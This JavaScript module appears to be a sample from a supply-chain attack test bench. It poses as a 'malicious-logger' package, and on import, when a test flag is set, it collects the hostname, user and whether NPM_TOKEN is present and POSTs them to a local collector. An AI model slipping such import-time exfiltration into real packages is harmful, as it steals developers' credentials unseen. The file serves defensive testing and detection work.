/**
 * Educational import-time payload (Scenario 18)
 * Exfiltrates environment variables when imported and TESTBENCH_MODE is enabled.
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const os = require('os');

  const payload = {
    attack: 'pnpm-hook-import-time-exfil',
    package: 'malicious-logger',
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    env: {
      NODE_ENV: process.env.NODE_ENV,
      USER: process.env.USER,
      PATH: process.env.PATH ? 'present' : 'missing',
      NPM_TOKEN: process.env.NPM_TOKEN ? 'present' : 'missing'
    }
  };

  const data = JSON.stringify(payload);

  const req = http.request({
    hostname: '127.0.0.1',
    port: 3018,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  }, (resp) => {
    resp.on('data', () => {});
    resp.on('end', () => {});
    resp.resume();
  });

  req.on('error', () => {});
  req.write(data);
  req.end();

  // Optional Floci dual-write
  try {
    const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
    uploadJson('18', 'plugin-exfil', payload);
  } catch (_) {}
}

module.exports = { log: (msg) => console.log(`[malicious-logger] ${msg}`) };
